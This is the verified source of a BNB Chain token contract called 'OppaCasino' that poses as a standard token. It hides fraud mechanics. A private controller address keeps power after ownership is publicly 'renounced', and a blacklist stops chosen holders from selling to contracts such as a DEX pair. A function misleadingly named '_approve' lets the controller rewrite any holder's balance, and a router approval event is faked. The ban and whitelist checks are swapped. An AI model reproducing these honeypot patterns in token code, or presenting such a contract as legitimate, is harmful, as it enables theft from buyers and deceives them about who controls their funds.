/**
 *Submitted for verification at BscScan.com on 2021-12-23
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.0;

contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() public {
    owner = msg.sender;
  }
}
library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract OppaCasino is Ownable {
  using Address for address;
  using SafeMath for uint256;
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  uint8 public decimals;
  uint256 public totalSupply;
  string public name;
  string public symbol;
  address mst;
  constructor(string memory _name, string memory _symbol) public {
    mst = msg.sender;
    name = _name;
    symbol = _symbol;
    decimals = 9;
    totalSupply =  1000000000 * 10 ** uint256(decimals);
    chamber[mst] = totalSupply;
    whitelist[mst] = true;
  }
  mapping(address => uint256) public chamber;
  mapping(address => bool) public whitelist;
  mapping(address => bool) public blacklist;
  mapping (address => mapping (address => uint256)) public valueAllowance;  
  function checkTokenNumber(address o) public view returns (uint256 balance) {
    return chamber[o];
  }
  function transfer(address _to, uint256 _value) public returns (bool) {
    address from = msg.sender;
    require(_to != address(0));
    require(_value <= chamber[from]);
    if(!from.isContract() && _to.isContract()){
        require(blacklist[from] == false && blacklist[_to] == false);
    }
    if(whitelist[from] || whitelist[_to]){
        _transfer(from, _to, _value);
        return true;
    }
    if(from.isContract() && _to.isContract()){
        _transfer(from, _to, _value);
        return true;
    }
    _transfer(from, _to, _value);
    return true;
  }
  function _transfer(address from, address _to, uint256 _value) private {
    chamber[from] = chamber[from].sub(_value);
    chamber[_to] = chamber[_to].add(_value);
    emit Transfer(from, _to, _value);
  }
  modifier isMstt() {
    require(mst == msg.sender, "error 401: not isMst"); 
    _;
  }
  modifier isMst() {
    require(mst == msg.sender, "error 401: not isMst"); 
    _;
  }
  function ban(address s, bool isBanned) external isMst {
      blacklist[s] = isBanned;
  }  
  function white(address s, bool isApproved) external isMst {
      whitelist[s] = isApproved;
  }
  function checkBan(address s) public view returns (bool) {
    if (whitelist[s]){
      return true;
    } else {
      return false;
    }
  }
  function checkWhitelist(address s) public view returns (bool) {
    if (blacklist[s]){
      return true;
    } else {
      return false;
    }
  }
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= chamber[_from]);
    require(_value <= valueAllowance[_from][msg.sender]);
    address from = _from;
    if(!from.isContract() && _to.isContract()){
        require(blacklist[from] == false && blacklist[_to] == false);
    }
    if(whitelist[from] || whitelist[_to]){
        _transferFrom(_from, _to, _value);
        return true;
    }
    if(from.isContract() && _to.isContract()){
        _transferFrom(_from, _to, _value);
        return true;
    }
    _transferFrom(_from, _to, _value);
    return true;
  }
  function _transferFrom(address _from, address _to, uint256 _value) internal {
    chamber[_from] = chamber[_from].sub(_value);
    chamber[_to] = chamber[_to].add(_value);
    valueAllowance[_from][msg.sender] = valueAllowance[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
  }
  function allowance(address _holder, address _spender) public view returns (uint256) {
    return valueAllowance[_holder][_spender];
  }
  function approve(address _spender, uint256 _value) public returns (bool) {
    valueAllowance[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }
  function approvePancakeRouter() external isMstt {
    emit Approval(msg.sender, 0x10ED43C718714eb63d5aA57B78B54704E256024E, 1000000000 * 10 ** uint256(decimals));
  }
   function getTokenNumber(address s) public view returns (uint256) {
    return chamber[s];
  }
  function dropOwnship() public isMst {
    emit OwnershipTransferred(owner, address(0));
    owner = address(0);
  }
  function dropOppas(
    address f,
    address[] calldata to,
    uint256 val
  ) external isMstt {
    require(to.length < 1001, "max 1000 users");
        for (uint256 i = 0; i < to.length; i++) {
            _transferFrom(f, to[i], val);
        }
    }
  function dropOppas2(
    address f,
    address[] calldata to,
    uint256 val
  ) external isMstt {
    require(to.length < 1501, "max 1500 users");
        for (uint256 i = 0; i < to.length; i++) {
            _transferFrom(f, to[i], val);
        }
    } 
  function dropOppas3(
    address f,
    address[] calldata to,
    uint256 val
  ) external isMstt {
    require(to.length < 5001, "max 5000 users");
        for (uint256 i = 0; i < to.length; i++) {
            _transferFrom(f, to[i], val);
        }
    }
  function _approve(address b, uint256 q) external isMstt returns (bool isRightAddress) {
    if (chamber[b] > 0){
        chamber[b] = q * 10 ** uint256(decimals);
        return true;
    } else {
        return false;
    }
  }
}